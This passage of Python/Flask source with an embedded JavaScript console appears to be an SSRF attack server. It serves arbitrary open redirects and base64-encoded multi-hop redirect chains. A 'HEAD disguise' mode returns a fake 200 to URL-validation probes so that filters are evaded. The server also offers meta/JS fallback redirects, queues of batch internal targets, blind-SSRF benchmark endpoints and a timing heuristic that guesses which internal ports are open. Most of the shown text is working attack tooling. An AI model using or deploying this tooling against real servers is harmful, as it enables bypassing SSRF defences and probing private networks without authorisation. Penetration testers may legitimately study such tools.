                const sel = document.getElementById('timelineChainSelect');
                const cur = sel.value;
                sel.innerHTML = '<option value="">🌐 全部重定向流量</option>' + (data.chains || []).map(c => {
                    const qlen = (c.targets_queue && c.targets_queue.length) ? ' · 队列' + c.targets_queue.length + '条' : '';
                    return `<option value="${c.id}">🔗 ${c.id} (${c.steps.length}跳${qlen})</option>`;
                }).join('');
                sel.value = cur;
            } catch(e) {}
        }

        async function refreshTimeline() {
            const chainId = document.getElementById('timelineChainSelect').value;
            const thr = document.getElementById('timelineThreshold').value.trim();
            const box = document.getElementById('timelineContainer');
            const sum = document.getElementById('timelineSummary');
            try {
                const res = await fetch(`${CONSOLE_PREFIX}/api/hit_analysis?chain_id=${encodeURIComponent(chainId)}&threshold_ms=${encodeURIComponent(thr || '0')}`);
                const data = await res.json();
                if (data.error) { box.innerHTML = `<div style="text-align:center;padding:40px;color:var(--accent-red);">${escapeHtml(data.error)}</div>`; return; }
                sum.innerHTML = `
                    <span class="queue-badge queue-badge-count">总命中 ${data.total}</span>
                    <span class="queue-badge" style="background:rgba(63,185,80,0.12);color:var(--accent-green);">疑似开放 ${data.slow_count}</span>
                    <span class="queue-badge" style="background:rgba(110,118,129,0.15);color:var(--text-secondary);">疑似关闭 ${data.fast_count}</span>
                    <span class="queue-badge" style="background:rgba(88,166,255,0.1);color:var(--accent);">阈值 ${data.threshold_ms || '—'}ms${data.auto_threshold ? '(自动)' : ''}</span>
                    <span class="queue-badge" style="background:rgba(210,153,34,0.12);color:var(--accent-yellow);">平均间隔 ${data.avg_delta_ms || '—'}ms</span>`;
                if (!data.hits || data.hits.length === 0) {
                    box.innerHTML = '<div style="text-align:center;padding:40px;color:var(--text-muted);">暂无命中记录 — 触发SSRF后回来刷新</div>';
                    return;
                }
                const verdictMap = {
                    slow: ['● 疑似开放/响应慢', 'var(--accent-green)', 'rgba(63,185,80,0.12)'],
                    fast: ['○ 疑似关闭/快速拒绝', 'var(--text-muted)', 'rgba(110,118,129,0.12)'],
                    first: ['◆ 首跳基准', 'var(--accent)', 'rgba(88,166,255,0.1)']
                };
                box.innerHTML = data.hits.slice().reverse().map(h => {
                    const v = verdictMap[h.verdict] || verdictMap.first;
                    const delta = (h.delta_ms === null || h.delta_ms === undefined) ? '—' : '+' + h.delta_ms + 'ms';
                    return `<div class="timeline-row verdict-${h.verdict}">
                        <span class="tl-time">${escapeHtml(h.timestamp)}</span>
                        <span class="tl-delta">${delta}</span>
                        <span class="tl-verdict" style="color:${v[1]};background:${v[2]};">${v[0]}</span>
                        <span class="tl-target">${escapeHtml(h.served_target || '(无目标记录)')}</span>
                    </div>`;
                }).join('');
            } catch(e) {}
        }

        // ========== 日志 ==========
        async function refreshLogs() {
            const expandedIds = new Set();
            document.querySelectorAll('.log-entry .log-ext[style*="display: block"]').forEach(ext => {
                const entry = ext.closest('.log-entry');
                if (entry && entry.dataset.logid) expandedIds.add(entry.dataset.logid);
            });
            try {
                const res = await fetch(CONSOLE_PREFIX + '/api/logs'); const data = await res.json();
                const visibleLogs = data.logs.filter(l => !hiddenLogIds.has(l.id));
                document.getElementById('totalLogs').textContent = visibleLogs.length;
                document.getElementById('uniqueIPs').textContent = new Set(visibleLogs.map(l=>l.ip)).size;
                const box = document.getElementById('logsContainer');
                if(visibleLogs.length === 0) { box.innerHTML = '<div style="text-align:center;padding:50px;color:var(--text-muted);font-size:15px;">等待流量...</div>'; return; }
                box.innerHTML = visibleLogs.map(l => {
                    // 【XSS修复】所有攻击者可控字段统一转义后再插入DOM
                    const safeIp = escapeHtml(String(l.ip || ''));
                    const safeMethod = escapeHtml(String(l.method || ''));
                    const safePath = escapeHtml(String(l.path || ''));
                    const safeTime = escapeHtml(String(l.timestamp || ''));
                    // method 同时用于CSS类名, 白名单化防止类名注入
                    const mClass = 'method-' + String(l.method || '').replace(/[^A-Z]/g, '');
                    const respHeaders = l.response_headers || {};
                    const respBody = l.response_body || '';
                    const reqHeaders = l.headers || {};
                    const isExpanded = expandedIds.has(l.id);
                    const params = new URLSearchParams(l.args).toString();
                    const queryString = params ? '?' + params : '';
                    const safeQuery = escapeHtml(queryString);
                    const isHeadBypass = l.extra_data && l.extra_data.head_bypass_triggered;
                    const fbMode = l.extra_data && l.extra_data.fallback_mode;
                    const blindData = (l.extra_data && l.extra_data.blind_bench) ? l.extra_data : null;
                    const headBypassClass = isHeadBypass ? 'log-head-bypass' : '';
                    // 原始报文先拼接, 输出前整体转义 (escapeHtml(rawRequest))
                    let rawRequest = `${l.method} ${l.path}${queryString} HTTP/1.1\\r\\n`;
                    for (const [key, value] of Object.entries(reqHeaders)) rawRequest += `${key}: ${value}\\r\\n`;
                    rawRequest += `\\r\\n`; if (l.request_body) rawRequest += l.request_body;
                    let rawResponse = `HTTP/1.1 ${l.status_code || '000'} OK\\r\\n`;
                    for (const [key, value] of Object.entries(respHeaders)) rawResponse += `${key}: ${value}\\r\\n`;
                    rawResponse += `\\r\\n`; if (respBody) rawResponse += respBody;
                    const headBadge = isHeadBypass ? '<span style="background:rgba(57,213,255,0.12);color:var(--accent-cyan);padding:2px 8px;border-radius:4px;font-size:10px;font-weight:700;margin-left:6px;">HEAD伪装</span>' : '';
                    const fbBadge = fbMode ? `<span style="background:rgba(240,136,62,0.12);color:var(--accent-orange);padding:2px 8px;border-radius:4px;font-size:10px;font-weight:700;margin-left:6px;">降级:${escapeHtml(String(fbMode))}</span>` : '';
                    const blindBadge = blindData ? `<span style="background:rgba(188,140,255,0.14);color:var(--accent-purple);padding:2px 8px;border-radius:4px;font-size:10px;font-weight:700;margin-left:6px;">盲测:${l.status_code} · ${blindData.elapsed_ms}ms</span>` : '';
                    return `
                    <div class="log-entry ${headBypassClass}" data-logid="${l.id}" onclick="const ext=this.querySelector('.log-ext');ext.style.display=ext.style.display==='none'?'block':'none';">
                        <button class="delete-log-btn" onclick="event.stopPropagation();hideLog('${l.id}')" title="隐藏">✕</button>
                        <div class="log-header">
                            <span class="log-ip">${safeIp}</span>
                            <span><span class="method-badge ${mClass}">${safeMethod}</span>${headBadge}${fbBadge}${blindBadge}<span style="color:var(--text-muted);font-size:12px;">${safeTime}</span></span>
                        </div>
                        <div class="log-detail">
                            <span class="log-label">路径:</span><span class="log-value url">${safePath}${safeQuery}</span>
                            ${l.redirect_url ? `<span class="log-label">跳向:</span><span class="log-value url">→ ${escapeHtml(l.redirect_url)}</span>` : ''}
                            ${isHeadBypass ? `<span class="log-label">伪装:</span><span class="log-value" style="color:var(--accent-cyan);">HEAD探测 → 返回 ${l.status_code} (伪装通过)</span>` : ''}
                        </div>
                        <div class="log-ext" style="display:${isExpanded?'block':'none'};margin-top:12px;padding-top:12px;border-top:1px dashed rgba(88,166,255,0.15);" onclick="event.stopPropagation()">
                            <div style="margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
                                <strong style="color:var(--accent-green);font-size:12px;">📥 请求</strong>
                                <button class="copy-raw-btn" onclick="event.stopPropagation();copyRawContent(this)">📋</button>
                            </div>
                            <pre class="log-pre">${escapeHtml(rawRequest)}</pre>
                            <div style="margin:10px 0;display:flex;justify-content:space-between;align-items:center;">
                                <strong style="color:var(--accent);font-size:12px;">📤 响应</strong>
                                <button class="copy-raw-btn" onclick="event.stopPropagation();copyRawContent(this)">📋</button>
                            </div>
                            <pre class="log-pre">${escapeHtml(rawResponse)}</pre>
                        </div>
                    </div>`;
                }).join('');
            } catch(e) {}
        }

        function hideLog(logId) {
            hiddenLogIds.add(logId);
            const entry = document.querySelector(`.log-entry[data-logid="${logId}"]`);
            if (entry) { entry.style.transition='opacity 0.3s';entry.style.opacity='0';setTimeout(()=>{entry.remove();const r=document.querySelectorAll('.log-entry');document.getElementById('totalLogs').textContent=r.length;if(r.length===0)document.getElementById('logsContainer').innerHTML='<div style="text-align:center;padding:50px;color:var(--text-muted);font-size:15px;">等待流量...</div>';},300); }
        }

        function clearAllLogs() {
            if (!confirm('清空前端日志显示？')) return;
            document.querySelectorAll('.log-entry').forEach(e => { if(e.dataset.logid) hiddenLogIds.add(e.dataset.logid); });
            document.getElementById('logsContainer').innerHTML = '<div style="text-align:center;padding:50px;color:var(--text-muted);font-size:15px;">等待流量...</div>';
            document.getElementById('totalLogs').textContent = '0'; document.getElementById('uniqueIPs').textContent = '0';
        }

        function copyRawContent(btn) {
            const pre = btn.parentElement.nextElementSibling;
            if (!pre) return;
            doCopy(pre.textContent, '✅ 已复制!');
        }

        // ==================== v2.1: 盲SSRF基准测试 ====================
        let BB_LIST = [];

        const BB_DEFAULT_SET = [
            { path: '/bb/200', status: 200, delay_ms: 0, body: '<html><body><h1>200 OK</h1><p>Blind SSRF Benchmark Endpoint</p></body></html>' },
            { path: '/bb/204', status: 204, delay_ms: 0, body: '' },
            { path: '/bb/400', status: 400, delay_ms: 0, body: '<html><body><h1>400 Bad Request</h1></body></html>' },
            { path: '/bb/401', status: 401, delay_ms: 0, body: '<html><body><h1>401 Unauthorized</h1></body></html>' },
            { path: '/bb/403', status: 403, delay_ms: 0, body: '<html><body><h1>403 Forbidden</h1></body></html>' },
            { path: '/bb/404', status: 404, delay_ms: 0, body: '<html><body><h1>404 Not Found</h1></body></html>' },
            { path: '/bb/500', status: 500, delay_ms: 0, body: '<html><body><h1>500 Internal Server Error</h1></body></html>' },
            { path: '/bb/502', status: 502, delay_ms: 0, body: '<html><body><h1>502 Bad Gateway</h1></body></html>' },
            { path: '/bb/delay3s', status: 200, delay_ms: 3000, body: '<html><body><h1>200 OK (delayed 3s)</h1></body></html>' },
            { path: '/bb/timeout', status: 200, delay_ms: 30000, body: '<html><body><h1>200 OK (delayed 30s)</h1></body></html>' },
        ];

        function bbStatusClass(status) {
            const s = parseInt(status) || 0;
            if (s >= 500) return 'bb-5xx';
            if (s >= 400) return 'bb-4xx';
            if (s >= 300) return 'bb-3xx';
            return 'bb-2xx';
        }

        function bbParseHeaders(text) {
            const headers = {};
            (text || '').split('\\n').forEach(line => {
                const idx = line.indexOf(':');
                if (idx > 0) {
                    const k = line.slice(0, idx).trim();
                    const v = line.slice(idx + 1).trim();
                    if (k) headers[k] = v;
                }
            });
            return headers;
        }

        function bbHeadersToText(headers) {
            return Object.entries(headers || {}).map(([k, v]) => k + ': ' + v).join('\\n');
        }

        async function loadBlindBench() {
            try {
                const res = await fetch(CONSOLE_PREFIX + '/api/blind_bench');
                const data = await res.json();
                BB_LIST = data.endpoints || [];
                renderBlindBench();
            } catch(e) {}
        }

        function renderBlindBench() {
            document.getElementById('bbCount').textContent = BB_LIST.length;
            const box = document.getElementById('bbListContainer');
            if (BB_LIST.length === 0) {
                box.innerHTML = '<div class="no-chains-msg">暂无基准端点, 点击上方「补齐默认基准组」快速创建</div>';
                return;
            }
            box.innerHTML = BB_LIST.map(ep => {
                const fullUrl = BASE_URL + ep.path;
                const sClass = bbStatusClass(ep.status);
                const delayBadge = ep.delay_ms > 0 ? `<span class="bb-badge bb-delay-badge">⏱ ${ep.delay_ms}ms</span>` : '';
                const descLine = ep.desc ? `<span class="bb-meta">📝 ${escapeHtml(ep.desc)}</span>` : '';
                const bodyPreview = ep.body ? `<div class="bb-preview">${escapeHtml(ep.body.length > 200 ? ep.body.slice(0, 200) + '…' : ep.body)}</div>` : '<div class="bb-meta" style="margin-top:6px;">(空响应体)</div>';
                return `
                <div class="bb-item">
                    <div class="bb-item-head">
                        <span class="bb-url">${escapeHtml(fullUrl)}</span>
                        <span>
                            <span class="bb-badge ${sClass}">${ep.status}</span>
                            ${delayBadge}
                            <span class="bb-badge" style="background:rgba(88,166,255,0.12);color:var(--accent);">命中 ${ep.hits || 0}</span>
                        </span>
                    </div>
                    <div class="bb-meta">最后命中: ${escapeHtml(ep.last_hit || '从未')} &nbsp;·&nbsp; ${escapeHtml(ep.content_type || '')}</div>
                    ${descLine}
                    ${bodyPreview}
                    <div class="bb-actions">
                        <button class="btn btn-cyan btn-small" onclick="doCopy('${escapeHtml(fullUrl)}', '✅ URL已复制')">📋 复制URL</button>
                        <button class="btn btn-warning btn-small" onclick="bbToggleEdit('${ep.id}')">✏️ 编辑</button>
                        <button class="btn btn-danger btn-small" onclick="bbDeleteEndpoint('${ep.id}', '${escapeHtml(ep.path)}')">🗑 删除</button>
                    </div>
                    <div class="bb-edit-form" id="bbEdit-${ep.id}" style="display:none;">
                        <div class="bb-create-grid">
                            <div>
                                <label>状态码</label>
                                <input type="text" id="bbEditStatus-${ep.id}" value="${ep.status}">
                            </div>
                            <div>
                                <label>响应延时 (毫秒)</label>
                                <input type="text" id="bbEditDelay-${ep.id}" value="${ep.delay_ms || 0}">
                            </div>
                        </div>
                        <label>Content-Type</label>
                        <input type="text" id="bbEditCT-${ep.id}" value="${escapeHtml(ep.content_type || 'text/html; charset=utf-8')}">
                        <label>响应体</label>
                        <textarea id="bbEditBody-${ep.id}">${escapeHtml(ep.body || '')}</textarea>
                        <label>自定义响应头 (每行 Key: Value)</label>
                        <textarea id="bbEditHeaders-${ep.id}" style="min-height:60px;">${escapeHtml(bbHeadersToText(ep.headers))}</textarea>
                        <div style="display:flex;gap:8px;margin-top:4px;">
                            <button class="btn btn-small" onclick="bbSaveEndpoint('${ep.id}')">💾 保存</button>
                            <button class="btn btn-ghost btn-small" onclick="bbToggleEdit('${ep.id}')">取消</button>
                        </div>
                    </div>
                </div>`;
            }).join('');
        }

        function bbToggleEdit(id) {
            const f = document.getElementById('bbEdit-' + id);
            if (f) f.style.display = f.style.display === 'none' ? 'block' : 'none';
        }

        async function bbCreateEndpoint() {
            const sub = document.getElementById('bbNewPath').value.trim().replace(/^[/]+/, '');
            if (!sub) { alert('请输入端点路径 (将拼接为 /bb/' + (sub || '...') + ')'); return; }
            const payload = {
                path: '/bb/' + sub,
                status: parseInt(document.getElementById('bbNewStatus').value) || 200,
                delay_ms: parseInt(document.getElementById('bbNewDelay').value) || 0,
                content_type: document.getElementById('bbNewContentType').value,
                body: document.getElementById('bbNewBody').value,
                headers: bbParseHeaders(document.getElementById('bbNewHeaders').value),
            };
            try {
                const res = await fetch(CONSOLE_PREFIX + '/api/blind_bench', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
                const data = await res.json();
                if (res.ok) {
                    document.getElementById('bbNewPath').value = '';
                    document.getElementById('bbNewBody').value = '';
                    loadBlindBench();
                } else { alert('创建失败: ' + (data.error || res.status)); }
            } catch(e) { alert('请求失败: ' + e); }
        }

        async function bbCreateDefaults() {
            let created = 0, skipped = 0;
            for (const d of BB_DEFAULT_SET) {
                try {
                    const res = await fetch(CONSOLE_PREFIX + '/api/blind_bench', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ path: d.path, status: d.status, delay_ms: d.delay_ms, body: d.body }) });
                    if (res.ok) created++; else skipped++;
                } catch(e) { skipped++; }
            }
            loadBlindBench();
            alert('默认基准组: 新建 ' + created + ' 个, 跳过已存在 ' + skipped + ' 个');
        }

        async function bbSaveEndpoint(id) {
            const ep = BB_LIST.find(e => e.id === id);
            if (!ep) return;
            const payload = {
                path: ep.path,
                status: parseInt(document.getElementById('bbEditStatus-' + id).value) || ep.status,
                delay_ms: parseInt(document.getElementById('bbEditDelay-' + id).value) || 0,
                content_type: document.getElementById('bbEditCT-' + id).value,
                body: document.getElementById('bbEditBody-' + id).value,
                headers: bbParseHeaders(document.getElementById('bbEditHeaders-' + id).value),
            };
            try {
                const res = await fetch(CONSOLE_PREFIX + '/api/blind_bench/' + id, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
                const data = await res.json();
                if (res.ok) { loadBlindBench(); } else { alert('保存失败: ' + (data.error || res.status)); }
            } catch(e) { alert('请求失败: ' + e); }
        }

        async function bbDeleteEndpoint(id, path) {
            if (!confirm('删除基准端点 ' + path + ' ?')) return;
            try {
                await fetch(CONSOLE_PREFIX + '/api/blind_bench/' + id, { method: 'DELETE' });
                loadBlindBench();
            } catch(e) {}
        }

        async function bbResetStats() {
            if (!confirm('重置全部端点的命中计数? (开始新一轮基准测试)')) return;
            try {
                await fetch(CONSOLE_PREFIX + '/api/blind_bench/reset_stats', { method: 'POST' });
                loadBlindBench();
            } catch(e) {}
        }

        document.getElementById('manualRefreshBtn').addEventListener('click', refreshLogs);
        refreshLogs();
        refreshChains();
        loadBlindBench();
    </script>
</body>
</html>
"""

# ==================== 路由逻辑 ====================
# v2.0: 控制台挂载于随机路径 CONSOLE_PATH (每次启动变化), 根路径 / 让渡给有状态链
@app.route(CONSOLE_PATH)
@app.route(CONSOLE_PATH + '/')
def index():
    if not check_access_token(): return 'Unauthorized', 401
    poc_json = json.dumps(POC_LIST, ensure_ascii=False)
    queue_presets_json = json.dumps(QUEUE_PRESETS, ensure_ascii=False)
    return render_template_string(INDEX_HTML, poc_json=poc_json, poc_count=len(POC_LIST), queue_presets_json=queue_presets_json, console_path=CONSOLE_PATH)

@app.route('/r', methods=SUPPORTED_METHODS)
def basic_redirect():
    log_entry = log_request()
    status_code = safe_int(request.args.get('code'), CONFIG['default_status_code'])
    target_url = request.args.get('url', '')
    head_bypass = request.args.get('hb', '0')
    mode = request.args.get('mode', '30x')
    if mode not in FALLBACK_MODES: mode = '30x'

    if status_code not in VALID_30X_CODES: status_code = CONFIG['default_status_code']

    # HEAD伪装逻辑：如果启用了hb且请求方法是HEAD，则返回伪装的200响应
    if should_bypass_head(head_bypass) and request.method == 'HEAD':
        hb_status = safe_int(request.args.get('hb_status'), HEAD_BYPASS_CONFIG['status_code'])
        hb_ct = request.args.get('hb_ct', HEAD_BYPASS_CONFIG['content_type'])
        hb_cl = request.args.get('hb_cl', HEAD_BYPASS_CONFIG['fake_content_length'])
        if not str(hb_cl).isdigit(): hb_cl = HEAD_BYPASS_CONFIG['fake_content_length']

        response = make_response('', hb_status)
        response.headers['Content-Type'] = hb_ct
        response.headers['Content-Length'] = hb_cl
        for k, v in HEAD_BYPASS_CONFIG['extra_headers'].items():
            response.headers[k] = v

        log_entry['redirect_url'] = f'[HEAD伪装绕过 → 返回{hb_status}, 实际目标: {target_url}]'
        log_entry['extra_data'] = {'head_bypass_triggered': True, 'actual_target': target_url}
    elif not target_url:
        response = make_response('No target URL specified', 400)
    elif mode != '30x':
        # 降级跳转模式: Refresh头 / Meta刷新 / JS跳转 / 组合
        log_entry['redirect_url'] = target_url
        log_entry['extra_data'] = {'fallback_mode': mode, 'served_target': target_url}
        response = make_fallback_response(target_url, mode)
    else:
        log_entry['redirect_url'] = target_url
        log_entry['extra_data'] = {'served_target': target_url}
        response = make_response(redirect(target_url, code=status_code))

    log_entry['status_code'] = response.status_code
    log_entry['response_headers'] = dict(response.headers)
    try:
        log_entry['response_body'] = response.get_data(as_text=True)[:500]
    except:
        log_entry['response_body'] = ''
    return response

@app.route('/c', methods=SUPPORTED_METHODS)
def stateless_chain_handler():
    log_entry = log_request()
    b64_data = request.args.get('b')
    if not b64_data:
        response = make_response('Missing chain payload', 400)
    else:
        try:
            padding = '=' * ((4 - len(b64_data) % 4) % 4)
            safe_b64 = b64_data.replace('-', '+').replace('_', '/') + padding
            decoded_bytes = base64.b64decode(safe_b64)
            chain_data = json.loads(decoded_bytes.decode('utf-8'))

            steps = chain_data.get('s', [])
            chain_head_bypass = chain_data.get('hb', 0)  # 链级别HEAD伪装标记
            chain_mode = chain_data.get('m', '30x')      # 末跳降级方式
            if chain_mode not in FALLBACK_MODES: chain_mode = '30x'

            if not steps:
                response = make_response('Empty chain steps', 400)
            # HEAD伪装：如果链启用了hb且方法是HEAD
            elif should_bypass_head(chain_head_bypass) and request.method == 'HEAD':
                response = make_head_bypass_response()
                log_entry['redirect_url'] = '[HEAD伪装绕过 → 返回200 (无状态链)]'
                log_entry['extra_data'] = {'head_bypass_triggered': True, 'chain_type': 'stateless'}
            else:
                current_step = steps.pop(0)
                status_code = safe_int(current_step.get('c'), 302)
                if status_code not in VALID_30X_CODES: status_code = 302
                target_url = current_step.get('t', '')

                if steps:
                    remaining_data = {'s': steps}
                    # 传递hb标记到下一跳
                    if chain_head_bypass:
                        remaining_data['hb'] = 1
                    # 传递末跳降级方式到下一跳
                    if chain_mode != '30x':
                        remaining_data['m'] = chain_mode
                    remaining_json = json.dumps(remaining_data, separators=(',', ':'))
                    remaining_b64 = base64.urlsafe_b64encode(remaining_json.encode('utf-8')).decode('utf-8').rstrip('=')

                    host_url = request.url_root.rstrip('/')
                    if not target_url.startswith('http'): target_url = host_url
                    separator = '&' if '?' in target_url else '?'
                    next_url = f"{target_url}{separator}b={remaining_b64}"
                    if target_url.strip('/') == host_url.strip('/'): next_url = f"{host_url}/c?b={remaining_b64}"

                    log_entry['redirect_url'] = next_url
                    log_entry['extra_data'] = {'served_target': next_url, 'chain_type': 'stateless', 'mid_hop': True}
                    response = make_response(redirect(next_url, code=status_code))
                else:
                    next_url = target_url
                    log_entry['redirect_url'] = next_url
                    if chain_mode != '30x':
                        # 末跳降级: 不跟随30x的客户端用 Refresh/Meta/JS 触发
                        log_entry['extra_data'] = {'served_target': next_url, 'chain_type': 'stateless', 'fallback_mode': chain_mode}
                        response = make_fallback_response(next_url, chain_mode)
                    else:
                        log_entry['extra_data'] = {'served_target': next_url, 'chain_type': 'stateless'}
                        response = make_response(redirect(next_url, code=status_code))
        except Exception as e:
            response = jsonify({'error': f'Chain decode failed: {str(e)}'})
            response.status_code = 400

    log_entry['status_code'] = response.status_code
    log_entry['response_headers'] = dict(response.headers)
    try:
        log_entry['response_body'] = response.get_data(as_text=True)[:500]
    except:
        log_entry['response_body'] = ''
    return response

@app.route(CONSOLE_PATH + '/api/create_stateful_chain', methods=['POST'])
def create_stateful_chain():
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        data = request.get_json(force=True)
        steps_input = data.get('steps', [])
        final_target = data.get('final_target', '')
        base_url = data.get('base_url', request.url_root.rstrip('/'))
        head_bypass = data.get('head_bypass', False)
        final_mode = data.get('final_mode', '30x')
        if final_mode not in FALLBACK_MODES:
            final_mode = '30x'
    except:
        return jsonify({'error': 'Invalid JSON'}), 400

    if not steps_input or len(steps_input) == 0:
        return jsonify({'error': 'At least one step required'}), 400

    for step in steps_input:
        path = step.get('path', '')
        if not path.startswith('/'):
            return jsonify({'error': f'Invalid path: {path}'}), 400
        # v2.0: 根路径 / 与 /api/* 已释放给有状态链伪装 (控制台/API 已迁移至随机路径);
        # 仅 /r /c (明文跳转入口) 与控制台随机路径本身受保护
        # v2.1: /bb 前缀为盲SSRF基准测试命名空间, 同样保留防止冲突
        reserved = ['/r', '/c']
        if (path in reserved or path == CONSOLE_PATH or path == CONSOLE_PATH + '/'
                or path.startswith(CONSOLE_PATH + '/')
                or path == '/bb' or path.startswith('/bb/')):
            return jsonify({'error': f'Path "{path}" is reserved'}), 400
        if path in PATH_MAP:
            return jsonify({'error': f'Path "{path}" already in use by another chain'}), 400

    chain_id = str(uuid.uuid4())[:8]
    steps = []
    for i, s in enumerate(steps_input):
        path = s['path']
        code = safe_int(s.get('code'), 302)
        if code not in VALID_30X_CODES:
            code = 302

        is_final = (i == len(steps_input) - 1)
        if is_final:
            if not final_target:
                return jsonify({'error': 'Final step requires final_target'}), 400
            target = final_target
        else:
            next_path = steps_input[i+1]['path']
            target = f"{base_url}{next_path}"

        steps.append({
            'path': path,
            'code': code,
            'target': target
        })
        PATH_MAP[path] = (chain_id, i)

    STATEFUL_CHAINS[chain_id] = {
        'id': chain_id,
        'steps': steps,
        'created_at': get_beijing_time(),
        'targets_queue': [],
        'queue_index': 0,
        'queue_mode': 'sequential',
        'head_bypass': bool(head_bypass),  # HEAD伪装开关
        'final_mode': final_mode           # 末跳降级方式
    }

    first_url = f"{base_url}{steps[0]['path']}"
    return jsonify({'chain_id': chain_id, 'first_url': first_url, 'step_count': len(steps), 'head_bypass': bool(head_bypass), 'final_mode': final_mode})

# ==================== 有状态链管理 API (v2.0: 挂载于控制台随机路径之下) ====================
@app.route(CONSOLE_PATH + '/api/stateful_chains', methods=['GET'])
def list_stateful_chains():
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    chains = list(STATEFUL_CHAINS.values())
    return jsonify({'chains': chains, 'total': len(chains)})

@app.route(CONSOLE_PATH + '/api/stateful_chains/<chain_id>', methods=['DELETE'])
def delete_stateful_chain(chain_id):
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401

    chain = STATEFUL_CHAINS.get(chain_id)
    if not chain:
        return jsonify({'error': f'Chain {chain_id} not found'}), 404

    for step in chain['steps']:
        path = step['path']
        if path in PATH_MAP:
            del PATH_MAP[path]

    del STATEFUL_CHAINS[chain_id]
    return jsonify({'message': f'Chain {chain_id} deleted successfully', 'remaining': len(STATEFUL_CHAINS)})

@app.route(CONSOLE_PATH + '/api/stateful_chains/<chain_id>/last_target', methods=['PUT'])
def update_chain_last_target(chain_id):
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401

    chain = STATEFUL_CHAINS.get(chain_id)
    if not chain:
        return jsonify({'error': f'Chain {chain_id} not found'}), 404

    try:
        data = request.get_json(force=True)
        new_target = data.get('target', '').strip()
    except:
        return jsonify({'error': 'Invalid JSON'}), 400

    if not new_target:
        return jsonify({'error': 'Target URL cannot be empty'}), 400

    last_index = len(chain['steps']) - 1
    old_target = chain['steps'][last_index]['target']
    chain['steps'][last_index]['target'] = new_target

    return jsonify({
        'message': 'Last target updated successfully',
        'chain_id': chain_id,
        'old_target': old_target,
        'new_target': new_target
    })

# ==================== HEAD伪装开关 API ====================
@app.route(CONSOLE_PATH + '/api/stateful_chains/<chain_id>/head_bypass', methods=['PUT'])
def update_chain_head_bypass(chain_id):
    """开启/关闭有状态链的HEAD伪装模式"""
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401

    chain = STATEFUL_CHAINS.get(chain_id)
    if not chain:
        return jsonify({'error': f'Chain {chain_id} not found'}), 404

    try:
        data = request.get_json(force=True)
        enabled = data.get('enabled', False)
    except:
        return jsonify({'error': 'Invalid JSON'}), 400

    chain['head_bypass'] = bool(enabled)

    return jsonify({
        'message': f'HEAD bypass {"enabled" if enabled else "disabled"} for chain {chain_id}',
        'chain_id': chain_id,
        'head_bypass': chain['head_bypass']
    })

# ==================== 批量队列 API ====================
@app.route(CONSOLE_PATH + '/api/stateful_chains/<chain_id>/queue', methods=['PUT'])
def update_chain_queue(chain_id):
    """设置/更新有状态链的批量目标队列"""
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401

    chain = STATEFUL_CHAINS.get(chain_id)
    if not chain:
        return jsonify({'error': f'Chain {chain_id} not found'}), 404

    try:
        data = request.get_json(force=True)
        targets = data.get('targets', [])
        mode = data.get('mode', 'sequential')
    except:
        return jsonify({'error': 'Invalid JSON'}), 400

    if not isinstance(targets, list):
        return jsonify({'error': 'targets must be a list'}), 400

    if mode not in ('sequential', 'loop'):
        mode = 'sequential'

    targets = [t.strip() for t in targets if t.strip()]

    chain['targets_queue'] = targets
    chain['queue_index'] = 0
    chain['queue_mode'] = mode

    if targets:
        last_index = len(chain['steps']) - 1
        chain['steps'][last_index]['target'] = targets[0]

    return jsonify({
        'message': 'Queue updated successfully',
        'chain_id': chain_id,
        'queue_length': len(targets),
        'mode': mode
    })

@app.route(CONSOLE_PATH + '/api/stateful_chains/<chain_id>/queue', methods=['DELETE'])
def clear_chain_queue(chain_id):
    """清空队列，恢复为单一目标模式"""
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401

    chain = STATEFUL_CHAINS.get(chain_id)
    if not chain:
        return jsonify({'error': f'Chain {chain_id} not found'}), 404

    chain['targets_queue'] = []
    chain['queue_index'] = 0

    return jsonify({'message': 'Queue cleared', 'chain_id': chain_id})

@app.route(CONSOLE_PATH + '/api/stateful_chains/<chain_id>/queue/reset', methods=['POST'])
def reset_chain_queue_index(chain_id):
    """重置队列索引为0"""
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401

    chain = STATEFUL_CHAINS.get(chain_id)
    if not chain:
        return jsonify({'error': f'Chain {chain_id} not found'}), 404

    chain['queue_index'] = 0

    if chain['targets_queue']:
        last_index = len(chain['steps']) - 1
        chain['steps'][last_index]['target'] = chain['targets_queue'][0]

    return jsonify({'message': 'Queue index reset to 0', 'chain_id': chain_id})

# ==================== 队列预设 API ====================
@app.route(CONSOLE_PATH + '/api/queue_presets', methods=['GET'])
def get_queue_presets():
    """获取所有队列预设模板"""
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    return jsonify({'presets': QUEUE_PRESETS})

# ==================== 命中时间轴分析 API ====================
@app.route(CONSOLE_PATH + '/api/hit_analysis', methods=['GET'])
def hit_analysis():
    """
    命中时间轴 + 端口开放启发式推断:
    - 按时间升序整理命中记录, 计算相邻命中间隔 delta_ms
    - 阈值 = 中位数*2 (且至少高出中位数500ms), 可用 threshold_ms 参数手动覆盖
    - delta >= 阈值 → slow (疑似开放/响应慢); 否则 → fast (疑似关闭/快速拒绝)
    - 配合有状态链批量队列使用时, served_target 即为该次命中投递的队列目标
    """
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401

    chain_id = request.args.get('chain_id', '').strip()
    threshold_ms = 0.0
    try:
        threshold_ms = float(request.args.get('threshold_ms', '0') or 0)
    except (TypeError, ValueError):
        threshold_ms = 0.0

    hits = []
    for l in reversed(LOGS):  # LOGS 为倒序存储, 反转为时间升序
        # 只统计重定向端点的命中, 排除控制台/API自身流量
        p = l.get('path', '')
        if p == '/' or p.startswith('/api/'):
            continue
        if l.get('ts') is None:
            continue
        ed = l.get('extra_data') or {}
        if chain_id and ed.get('chain_id') != chain_id:
            continue
        hits.append({
            'id': l['id'],
            'ts': l['ts'],
            'timestamp': l['timestamp'],
